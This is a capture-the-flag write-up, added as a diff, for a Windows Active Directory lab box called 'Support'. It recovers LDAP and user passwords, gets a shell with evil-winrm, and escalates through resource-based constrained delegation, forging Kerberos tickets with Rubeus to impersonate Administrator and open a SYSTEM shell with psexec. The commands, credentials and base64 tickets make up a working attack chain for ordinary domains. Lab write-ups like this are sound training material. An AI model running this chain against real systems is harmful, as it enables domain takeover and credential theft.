@@ -1,0 +1,312 @@
+[Profile]{
+Machine: Support
+ip: 10.129.103.188
+OS: Windows
+}
+
+[Enumeration]{
+nmap -sC -sV -Pn 10.129.103.188 -oN nmap_support
+smbclient -L  //10.129.103.188/ -N
+We find a suspicious share UserInfo --> download it --> examine it..
+ILSpy --> LDAP function --> getPassword --> then use the enc and the function algo to get the ldap password
+`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
+
+who is armando ? 
+
+
+
+}
+
+[Exploitation]{
+
+└──╼ $ldapsearch -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*" >ldap_search_result
+
+Then we look into it, and get the password for support ( CN=support ) : 
+5094 info: Ironside47pleasure40Watchful
+
+So the password is : Ironside47pleasure40Watchful
+
+Then evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
+|-> get the user.txt at the Desktop folder.
+
+}
+
+[PrivEsc]{
+
+SharpHound.exe upload through evil-winrm  ---> zip, drop it on Bloundhound --> RBCD ( Resource Based Constrained Delegation )
+To see how many computers we can add on the domain through the ms-DS-MachineAccountQuota
+```bash
+Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+DistinguishedName         : DC=support,DC=htb
+ms-DS-MachineAccountQuota : 10
+Name                      : support
+ObjectClass               : domainDNS
+ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
+```
+Then we can add 10. But a good one should be enough.
+
+we upload PowerView.ps1 through the evil-winrm.
+|-> Now we can use Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
+  and the msds-allowedtoactonbehalfofotheridentit is empty.
+
+We upload what we will need for the next steps: Powermad.ps1, Rubeus.exe
+```Powershell
+New-MachineAccount -MachineAccount JoKer -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
+ 
+[+] Machine account JoKer added
+*Evil-WinRM* PS C:\Users\support\Desktop> Get-ADComputer -identity JoKer
+
+
+DistinguishedName : CN=JoKer,CN=Computers,DC=support,DC=htb
+DNSHostName       : JoKer.support.htb
+Enabled           : True
+Name              : JoKer
+ObjectClass       : computer
+ObjectGUID        : 61af2380-c5cd-47c7-b388-f3ae61cb1abe
+SamAccountName    : JoKer$
+SID               : S-1-5-21-1677581083-3380853377-188903654-6101
+UserPrincipalName :
+```
+Configuring the RBCD directly..
+```PS
+*Evil-WinRM* PS C:\Users\support\Desktop> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount JoKer$
+*Evil-WinRM* PS C:\Users\support\Desktop> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+
+
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
+DNSHostName                          : dc.support.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
+PrincipalsAllowedToDelegateToAccount : {CN=JoKer,CN=Computers,DC=support,DC=htb}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
+UserPrincipalName                    :
+```
+Set-ADComputer command to configure RBCD.
+To verify that the command worked, we can use the Get-ADComputer command.
+As we can see, the PrincipalsAllowedToDelegateToAccount is set to JoKer , which means the command worked. We can also verify the value of the msds-allowedtoactonbehalfofotheridentity .
+
+ ```PS
+ Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
+
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+```
+
+As we can see, the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type
+of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand
+what's going on.
+```PS
+*Evil-WinRM* PS C:\Users\support\Desktop> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+*Evil-WinRM* PS C:\Users\support\Desktop> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+*Evil-WinRM* PS C:\Users\support\Desktop> $Descriptor
+$Descriptor.DiscretionaryAcl
+
+
+ControlFlags           : DiscretionaryAclPresent, SelfRelative
+Owner                  : S-1-5-32-544
+Group                  :
+SystemAcl              :
+DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
+ResourceManagerControl : 0
+BinaryLength           : 80
+
+BinaryLength       : 36
+AceQualifier       : AccessAllowed
+IsCallback         : False
+OpaqueLength       : 0
+AccessMask         : 983551
+SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-6101
+AceType            : AccessAllowed
+AceFlags           : None
+IsInherited        : False
+InheritanceFlags   : None
+PropagationFlags   : None
+AuditFlags         : None
+
+```
+
+```PS
+.\Rubeus.exe hash /password:Password123! /user:JoKer$ /domain:support.htb
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Password123!
+[*] Input username             : JoKer$
+[*] Input domain               : support.htb
+[*] Salt                       : SUPPORT.HTBhostjoker.support.htb
+[*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE
+[*]       aes128_cts_hmac_sha1 : ADA681D0C5B2D83DA92636C27F3D1FD2
+[*]       aes256_cts_hmac_sha1 : 3677433EF8659CC495FDD87F055CDECB0AC419D4E19FF8A3C376816B43ECD47C
+[*]       des_cbc_md5          : 75292A1C6EFD49B9
+
+```
+
+```PS
+*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe s4u /user:JoKer$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
+[*] Building AS-REQ (w/ preauth) for: 'support.htb\JoKer$'
+[*] Using domain controller: ::1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFSDCCBUSgAwIBBaEDAgEWooIEYjCCBF5hggRaMIIEVqADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
+      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBBwwggQYoAMCARKhAwIBAqKCBAoEggQGb9vOOywQ
+      H0SALucBdXyqHEznfsCZZGokSWE7Fe6nnNNTSdJsfpzE7Inl1rNOjajvpMTtn9jdTNhdAe7h0cbzpgmy
+      GFr1QHZlpeFetaKY4jdID+RGdtSALsC3nVlExlZhYEg8qkbOAU//PkYLnT7cBPZaXYaXnAnd4RhLvv5L
+      S8iEdBYO+rwsnWJPmCh+Af/z2H4AwWvwyG4f7QZ4aJuMKFtRkHeQc5wFxwwczkEdO+DHA66UAU3ylacQ
+      nHUsQN8rgDDwoy4GiwjbUIy1DeRIMGu7zjAsrOKev2k1MKpM8V71UukbfiRqOfc7lMd0693FnxTJXP3e
+      g16p8177ylQUELidNC3fkJ8D3Cr/v9u2zp906Wqam7akarN0ID5hUtuFY+POdpx3LU3+mxXd2tvosU35
+      UPdxfzwQbHDoIKZwY4Z44vMMbveT5dqSH/W0r+eSNpeKhc/Eg3IXtXv3SBq3l7t/3Fn0bkkQZE1eBT4k
+      r1WFA63fiIhx9SQd/Gp0gwY6G9Z0rTSs/QJwti2InCrwJ0dRpG7uBBLjFL25DN/bpl8sw+7akoQHARG/
+      MkWu60fR1iGwWfWn1Ovt1136M1s95OYho4H7m8nBuR7YoL1iiKIuyTMmrWcz+ChphZTKUUoDUOIh+ji+
+      m+2fX7GEBeX0wUWP5xzTe9BsDfLnRxuJ0zEidiQySEMvxTEm/Zvk+PmVOlQM89i5H4QtYwAjm0Q/k42w
+      U9MBYl2KuKhdQ85M/+op2ttvw2yEDsKUrqtfbmErbhaEGsu9S7LadCbUV2HKVVQbpvRT5xW45ZNWr5Ks
+      ujKbDoAZ9cLGIJOOv9jw6zi65TpX3gd12TwjUxhIW/CJFuJC/GE6ge/HMLDoHtpsZzX/kfnRbq3i2ifn
+      SNUbOosfrdRU4kfvHSQtPgewiXTpf34rbbETsxTHx4HqSMmLRGtU9t0/XER6DXWyGgpCwkQ4dAn5yhUu
+      hmXtNIyveDhieqRYLRYhIrQbYuB04pmxOuqHi1H0GPDpBw81xw/yfbgKWR8PiC9nvlP8bD16QdFAr79p
+      Qi53w3NB6/Rov08HBuCVgM8FiMDgT9Muy9DJmqOWAwt/zPdHMFbCFXaiVc7Yo65PsJ/nYOHgYgekavyr
+      IF+4fE2AaqQn2PQP6T0X0lPwct2CnhucQuoGx7jI6ICHFaWdYCoAzhd2lENSf4mE83jWJaC6rbo3ymcW
+      FP7ndA1XxQiPtB6LeYmyciP9F1vRumt6yQ5LJd0YUMGofPRs1cLxCO6c9KENwGz9bi+y/pLDaB0ZIZJn
+      kaJ//mMHe1Cz1vnHoJ1UDMC0xWskqJWhzu/8Yp2o23uC0qmTRgFsDaFYtRODzENLPVDvCbUypEYqrrRW
+      T5XG9aOB0TCBzqADAgEAooHGBIHDfYHAMIG9oIG6MIG3MIG0oBswGaADAgEXoRIEEEp/oEgElLJoDjnn
+      R/7P2/OhDRsLU1VQUE9SVC5IVEKiEzARoAMCAQGhCjAIGwZKb0tlciSjBwMFAEDhAAClERgPMjAyNjA2
+      MTYxNjM1NDFaphEYDzIwMjYwNjE3MDIzNTQxWqcRGA8yMDI2MDYyMzE2MzU0MVqoDRsLU1VQUE9SVC5I
+      VEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBvcnQuaHRi
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'JoKer$@SUPPORT.HTB'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2self request to ::1:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'JoKer$@SUPPORT.HTB'
+[*] base64(ticket.kirbi):
+
+      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
+      S2VyJA==
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
+[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2proxy request to domain controller ::1:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
+
+      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
+      Gw5kYy5zdXBwb3J0Lmh0Yg==
+[+] Ticket successfully imported!
+```
+
+Then we copy the ticket, [remove the white spaces](browserling.com) before pasting in a file ticket.kirbi.b64
+then base64 -d ticket.kirbi.b64 > ticket.kirbi
+
+Then we can convert this ticket to a format impacket can use through ticketConverter 
+```bash
+──╼ $impacket-ticketConverter ticket.kirbi ticket.ccache
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] converting kirbi to ccache...
+[+] done
+```
+
+Oh man, really important, the time, sync the time for the kerberos ticket game to have a chance of working
+```bash
+sudo apt-get install ntpdate 
+sudo ntpdate dc.support.htb
+```
+And finally, it works 
+```bash
+KRB5CCNAME=t.ccache impacket-psexec  support.htb/administrator@dc.support.htb -k -no-pass
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+                                                              
+[*] Requesting shares on dc.support.htb.....       
+[*] Found writable share ADMIN$                    
+[*] Uploading file PYNvfltr.exe 
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service JBtz on dc.support.htb.....
+[*] Starting service JBtz.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+Now we gently take the root.txt in the C:\Users\Administrator\Desktop\root.txt
+
+}
